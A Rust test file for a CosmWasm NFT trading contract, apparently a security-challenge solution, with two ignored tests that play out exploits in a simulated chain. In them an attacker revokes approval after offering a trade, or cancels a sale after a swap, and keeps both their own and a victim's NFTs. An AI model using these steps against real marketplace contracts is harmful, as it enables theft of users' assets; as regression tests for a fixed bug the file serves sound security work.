#[cfg(test)]
mod tests{
    use cosmwasm_std::{Addr, Empty, Uint128, Attribute};
    use cw721::{OwnerOfResponse, Cw721QueryMsg};
    use cw_multi_test::Executor;

    use crate::{integration_tests::tests::{proper_instantiate, USER1, NFT1, NFT3, USER3, NFT2, ADMIN, mint_tokens, base_scenario, USER2}, msg::{ExecuteMsg, QueryMsg}, state::{Sale, Trade}};
    pub const ATTACKER: &str = "attacker";
    pub const NFT_1337: &str = "leet-nft";
    #[ignore="fixed bug"]
    #[test]
    fn exploit(){
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // Attacker is an NFT holder
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT_1337.to_string(),
                owner: ATTACKER.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();

        // Attacker gives approval to contract
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();


        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new sale
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();


        // Create trade offer
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();


        app.execute_contract(
            Addr::unchecked(ATTACKER),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();
        


        // Accept trade
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: ATTACKER.to_string(),
            },
            &[],
        )
        .unwrap();

        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, ATTACKER.to_string());
        
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT_1337.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, ATTACKER.to_string());

    }
    #[ignore="fixed bug"]
    #[test]
    fn exploit_sale(){
        let (mut app, contract_addr, token_addr) = proper_instantiate();
        const VICTIM : &str = USER1;
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT_1337.to_string(),
                owner: ATTACKER.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();
        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT_1337.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();

        let sale_info: Sale = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetSale {
                    id: NFT_1337.to_string(),
                },
            )
            .unwrap();
        assert_eq!(sale_info.owner, Addr::unchecked(ATTACKER));

        app.execute_contract(
            Addr::unchecked(VICTIM),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(VICTIM),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT_1337.to_string(),
                offered: NFT1.to_string(),
            },
            &[],
        )
        .unwrap();
    
        // The Attacker accepts the trade
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::AcceptTrade {
                id: NFT_1337.to_string(),
                trader: VICTIM.to_string(),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT2.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT2.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(VICTIM),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(VICTIM),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT2.to_string(),
                offered: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();

        // Check ownerships at this point
        let owner_of_1337: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT_1337.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of_1337.owner, VICTIM.to_string());

        let owner_of_2: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT2.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of_2.owner, contract_addr.to_string()); //The owner is the Contract, not USER2, as it has already been transfer


        let owner_of_1: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of_1.owner, ATTACKER.to_string());   
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::CancelSale {
                id: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();


        // Check final ownerships
        let owner_of_1337: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT_1337.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of_1337.owner, ATTACKER.to_string());
        
        let owner_of_1: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of_1.owner, ATTACKER.to_string()); 

        let owner_of_2: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT2.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of_2.owner, contract_addr.to_string()); //The owner is the Contract, not USER2, as it has already been transfer

    }
}